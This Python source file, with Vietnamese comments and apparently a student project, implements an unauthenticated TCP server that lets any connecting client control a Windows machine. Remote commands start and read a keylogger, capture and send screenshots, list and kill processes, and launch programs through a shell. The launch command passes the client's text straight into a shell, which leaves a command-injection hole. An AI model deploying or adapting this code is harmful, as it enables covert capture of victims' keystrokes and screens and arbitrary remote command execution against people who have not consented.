import io
import csv
import json
import psutil
import socket
import threading
import subprocess
from PIL import ImageGrab  # Để chụp màn hình
from keylogger import Keylogger
from shutdown import ServerShutdownWindow

class Server:
    def __init__(self):
        self.server_ip = ""
        self.socket = None
        self.running = False
        self.keylogger = Keylogger()
        self.client_threads = []

    def stop_server(self):
        self.running = False
        if self.socket:
            self.socket.close()
        for client_thread in self.client_threads:
            client_thread.join()
        self.keylogger.stop()


    def start_server(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.server_ip, 12345))
        self.socket.listen(1)
        print("Server đang chạy và lắng nghe kết nối.")
        self.running = True
        while self.running:
            try:
                client_socket, client_address = self.socket.accept()
                print(f"Đã kết nối từ {client_address[0]}:{client_address[1]}")

                # Tạo một luồng riêng để xử lý tin nhắn từ client
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_thread.start()
                self.client_threads.append(client_thread)

            except OSError:
                if not self.running:
                    break
                else:
                    raise

    def handle_client(self, client_socket):
        try:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                data = data.decode()
                response = self.process_request(data, client_socket)
                if response is not None:
                    client_socket.sendall(response.encode())
        except Exception as e:
            print(f"Lỗi xử lý yêu cầu từ client: {str(e)}")
        finally:
            client_socket.close()

    def process_request(self, request, client_socket):
        if request == "start":
            self.keylogger.start()
            return ""
        elif request == "stop":
            self.keylogger.stop()
            return ""
        elif request == "clear":
            self.keylogger.clear_log()
            return ""
        elif request == "print":
            logs = self.keylogger.read_log()
            return logs
        elif request == "screenshot":
            # Thực hiện chụp màn hình và gửi hình ảnh về máy khách
            screenshot = self.capture_screenshot()
            client_socket.sendall(str(len(screenshot)).encode())  # Gửi kích thước trước
            client_socket.sendall(screenshot)  # Gửi dữ liệu hình ảnh
            return None  # Không cần trả về gì ở đây
        elif request == "shutdown":
            shutdown_window = ServerShutdownWindow(self)
            shutdown_window.start()
            return "Server đã tắt"
        elif request == "apps":
            apps = self.get_running_applications()
            return json.dumps(apps)
        elif request == "processus":
            processes = self.get_running_processus()
            return json.dumps(processes)
        elif request.startswith("kill"):
            try:
                _, pid_str = request.split(" ", 1)  # Tách lệnh và PID
                pid = int(pid_str)  # Chuyển PID thành số nguyên
                return self.kill(pid)
            except ValueError:
                return "Invalid PID."
        elif request.startswith("start"):
            try:
                _, app_name = request.split(" ", 1)  # Tách lệnh và tên ứng dụng
                subprocess.Popen(["start", app_name], shell=True)
                return f"Started application: {app_name}"
            except ValueError:
                return "Invalid application name."
        else:
            return "Invalid request."

    # kill process
    def kill(self, pid):
        try:
            process = psutil.Process(pid)
            process.terminate()  # Kết thúc quy trình
            return f"Process with PID {pid} terminated."
        except psutil.NoSuchProcess:
                return "Process not found."
    
    # screenshot   
    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            image_byte_array = io.BytesIO()
            screenshot.save(image_byte_array, format="PNG")
            return image_byte_array.getvalue()
        except Exception as e:
            return f"Error capturing screenshot: {str(e)}"
    # running process
   
    def get_running_processus(self):
        try:
            # Sử dụng PowerShell để lấy thông tin về tiến trình và số luồng
            powershell_command = "Get-Process | Select-Object ProcessName, Id, Threads | ConvertTo-Json"
            result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True, check=True)

            # Phân tích kết quả JSON
            processes = json.loads(result.stdout)

            # Tạo danh sách mới chứa thông tin về số luồng của từng tiến trình
            processus = []

            for process in processes:
                process_name = process['ProcessName']
                pid = process['Id']
                thread_count = len(process['Threads'])
        
                # Thêm thông tin vào danh sách mới
                processus.append({'ProcessName': process_name, 'PID': pid, 'ThreadCount': thread_count})
           
            return processus

        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            return []
    # running apps, same as process
    def get_running_applications(self):
        try:
            # Sử dụng PowerShell để lấy thông tin về tiến trình, tiêu đề cửa sổ chính, và thread count
            powershell_command = "Get-Process | Where-Object { $_.MainWindowTitle -ne '' } | Select-Object ProcessName, Id, Threads | ConvertTo-Json"
            result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True, check=True)

            # Phân tích kết quả JSON
            processes = json.loads(result.stdout)

            # Tạo danh sách mới chứa thông tin về tiêu đề cửa sổ chính và thread count của từng tiến trình
            apps_list = []

            for process in processes:
                process_name = process['ProcessName']
                pid = process['Id']
                thread_count = len(process['Threads'])

                # Thêm thông tin vào danh sách mới
                apps_list.append({'ProcessName': process_name, 'PID': pid, 'ThreadCount': thread_count})
            print(apps_list)
            return apps_list

        except subprocess.CalledProcessError as e:
            print(f"Error: {e}")
            return []

        

if __name__ == "__main__":
    server = Server()
    server.start_server()